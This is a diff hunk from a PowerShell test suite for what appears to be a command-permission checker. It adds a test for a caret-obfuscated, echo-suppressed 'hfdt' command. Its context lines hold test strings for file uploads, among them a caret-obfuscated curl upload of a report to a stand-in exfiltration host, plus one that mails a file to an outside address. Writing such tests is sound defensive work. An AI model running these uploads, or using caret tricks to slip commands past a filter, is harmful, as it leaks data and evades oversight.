@@ -762,6 +762,7 @@ try {
     Test-Verdict 'curl.exe -T C:\work\report.csv http://10.4.2.17:8080/ingest' "allow" "careful-windows cmd: internal upload allowed" $carefulWindows $null $cmdTool
     Test-Verdict 'hfdt research --query "DROP TABLE positions"' "allow" "careful-windows cmd: bare hfdt trusted" $carefulWindows $null $cmdTool
     Test-Verdict 'h^fdt research --query "DROP TABLE positions"' "allow" "careful-windows cmd: caret-spelled hfdt trusted" $carefulWindows $null $cmdTool
+    Test-Verdict '@h^fdt research --query "DROP TABLE positions"' "allow" "careful-windows cmd: echo-suppressed hfdt trusted" $carefulWindows $null $cmdTool
     Test-Verdict '"C:\Program Files\Hfdt\hfdt.exe" publish --message "hooks.slack.com/services/example"' "allow" "careful-windows cmd: static hfdt.exe path trusted" $carefulWindows $null $cmdTool
     Test-Verdict 'echo safe ^& b^lat.exe body.txt -to outside@example.test' "allow" "careful-windows cmd: escaped ampersand remains data" $carefulWindows $null $cmdTool
     Test-Verdict 'echo safe 2>&1 c^url.exe -^T report.csv https://exfil.example.com/ingest' "allow" "careful-windows cmd: fd duplication stays in echo segment" $carefulWindows $null $cmdTool
